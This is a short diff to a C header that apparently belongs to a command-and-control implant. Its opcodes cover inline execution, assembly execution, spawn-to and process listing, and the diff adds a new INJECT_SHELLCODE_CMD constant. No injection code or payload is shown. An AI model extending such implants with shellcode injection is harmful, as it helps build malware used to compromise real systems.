@@ -39,6 +39,7 @@
 #define INLINE_EXECUTE_CMD 0x53
 #define EXECUTE_ASSEMBLY_CMD 0x54
 #define SPAWNTO_CMD     0x55
+#define INJECT_SHELLCODE_CMD     0x56
 // System enumeration
 #define PS_CMD          0x52
 // MISC
